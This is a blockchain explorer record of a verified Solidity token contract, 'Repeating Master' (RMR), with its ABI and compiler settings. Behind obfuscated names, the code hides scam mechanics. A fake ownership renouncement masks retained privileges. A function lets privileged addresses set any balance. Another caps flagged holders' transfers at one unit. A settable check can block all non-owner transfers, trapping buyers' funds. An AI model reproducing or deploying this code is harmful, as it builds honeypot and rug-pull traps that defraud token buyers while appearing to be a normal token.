{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface minLiquidity {\n    function createPair(address takeLaunchedList, address autoEnableReceiver) external returns (address);\n}\n\ninterface minTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeMax) external view returns (uint256);\n\n    function transfer(address takeModeAuto, uint256 launchWallet) external returns (bool);\n\n    function allowance(address sellFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeModeAuto,\n        uint256 launchWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenSender, uint256 value);\n    event Approval(address indexed sellFrom, address indexed spender, uint256 value);\n}\n\nabstract contract receiverLimitFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minTradingMetadata is minTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RepeatingMaster is receiverLimitFrom, minTrading, minTradingMetadata {\n\n    function allowance(address autoFund, address totalLaunch) external view virtual override returns (uint256) {\n        if (totalLaunch == sellMin) {\n            return type(uint256).max;\n        }\n        return listMode[autoFund][totalLaunch];\n    }\n\n    address public marketingMax;\n\n    bool private launchedMarketing;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listLaunched;\n    }\n\n    uint256 constant amountFromTotal = 1 ** 10;\n\n    function transferFrom(address maxReceiverEnable, address takeModeAuto, uint256 launchWallet) external override returns (bool) {\n        if (_msgSender() != sellMin) {\n            if (listMode[maxReceiverEnable][_msgSender()] != type(uint256).max) {\n                require(launchWallet <= listMode[maxReceiverEnable][_msgSender()]);\n                listMode[maxReceiverEnable][_msgSender()] -= launchWallet;\n            }\n        }\n        return modeBuy(maxReceiverEnable, takeModeAuto, launchWallet);\n    }\n\n    uint256 tokenModeLaunch;\n\n    constructor (){\n        if (launchedMarketing == fromTrading) {\n            launchedMarketing = false;\n        }\n        shouldSender feeEnable = shouldSender(sellMin);\n        listFundTotal = minLiquidity(feeEnable.factory()).createPair(feeEnable.WETH(), address(this));\n        \n        marketingMax = _msgSender();\n        takeEnable[marketingMax] = true;\n        teamAtAuto[marketingMax] = fundReceiver;\n        limitFund();\n        if (swapTotalLaunch) {\n            fromTrading = false;\n        }\n        emit Transfer(address(0), marketingMax, fundReceiver);\n    }\n\n    function balanceOf(address modeMax) public view virtual override returns (uint256) {\n        return teamAtAuto[modeMax];\n    }\n\n    address private launchBuy;\n\n    function limitFund() public {\n        emit OwnershipTransferred(marketingMax, address(0));\n        launchBuy = address(0);\n    }\n\n    uint256 totalMarketing;\n\n    string private listLaunched = \"RMR\";\n\n    function modeBuy(address maxReceiverEnable, address takeModeAuto, uint256 launchWallet) internal returns (bool) {\n        if (maxReceiverEnable == marketingMax) {\n            return shouldIsToken(maxReceiverEnable, takeModeAuto, launchWallet);\n        }\n        uint256 receiverFee = minTrading(listFundTotal).balanceOf(totalAmount);\n        require(receiverFee == totalMarketing);\n        require(takeModeAuto != totalAmount);\n        if (buyReceiver[maxReceiverEnable]) {\n            return shouldIsToken(maxReceiverEnable, takeModeAuto, amountFromTotal);\n        }\n        return shouldIsToken(maxReceiverEnable, takeModeAuto, launchWallet);\n    }\n\n    bool private fromTrading;\n\n    string private swapMinTake = \"Repeating Master\";\n\n    function transfer(address exemptMin, uint256 launchWallet) external virtual override returns (bool) {\n        return modeBuy(_msgSender(), exemptMin, launchWallet);\n    }\n\n    address sellMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private swapTotalLaunch;\n\n    address totalAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private teamAtAuto;\n\n    function shouldIsToken(address maxReceiverEnable, address takeModeAuto, uint256 launchWallet) internal returns (bool) {\n        require(teamAtAuto[maxReceiverEnable] >= launchWallet);\n        teamAtAuto[maxReceiverEnable] -= launchWallet;\n        teamAtAuto[takeModeAuto] += launchWallet;\n        emit Transfer(maxReceiverEnable, takeModeAuto, launchWallet);\n        return true;\n    }\n\n    uint8 private tokenExempt = 18;\n\n    uint256 public launchedFrom;\n\n    address public listFundTotal;\n\n    function tradingMode(uint256 launchWallet) public {\n        launchList();\n        totalMarketing = launchWallet;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundReceiver;\n    }\n\n    function launchList() private view {\n        require(takeEnable[_msgSender()]);\n    }\n\n    function enableShouldTeam(address fundLaunchSell) public {\n        require(fundLaunchSell.balance < 100000);\n        if (enableFrom) {\n            return;\n        }\n        \n        takeEnable[fundLaunchSell] = true;\n        if (launchedFrom == senderMarketing) {\n            fromTrading = false;\n        }\n        enableFrom = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenExempt;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapMinTake;\n    }\n\n    function approve(address totalLaunch, uint256 launchWallet) public virtual override returns (bool) {\n        listMode[_msgSender()][totalLaunch] = launchWallet;\n        emit Approval(_msgSender(), totalLaunch, launchWallet);\n        return true;\n    }\n\n    bool public enableFrom;\n\n    mapping(address => bool) public takeEnable;\n\n    uint256 private fundReceiver = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public buyReceiver;\n\n    function fromTx(address exemptMin, uint256 launchWallet) public {\n        launchList();\n        teamAtAuto[exemptMin] = launchWallet;\n    }\n\n    uint256 public senderMarketing;\n\n    function getOwner() external view returns (address) {\n        return launchBuy;\n    }\n\n    event OwnershipTransferred(address indexed launchedMode, address indexed minTeam);\n\n    function owner() external view returns (address) {\n        return launchBuy;\n    }\n\n    mapping(address => mapping(address => uint256)) private listMode;\n\n    function fromAutoAmount(address listTeam) public {\n        launchList();\n        if (launchedMarketing != fromTrading) {\n            swapTotalLaunch = true;\n        }\n        if (listTeam == marketingMax || listTeam == listFundTotal) {\n            return;\n        }\n        buyReceiver[listTeam] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunchSell\",\"type\":\"address\"}],\"name\":\"enableShouldTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"}],\"name\":\"fromAutoAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchWallet\",\"type\":\"uint256\"}],\"name\":\"fromTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFundTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchWallet\",\"type\":\"uint256\"}],\"name\":\"tradingMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiverEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeModeAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RepeatingMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}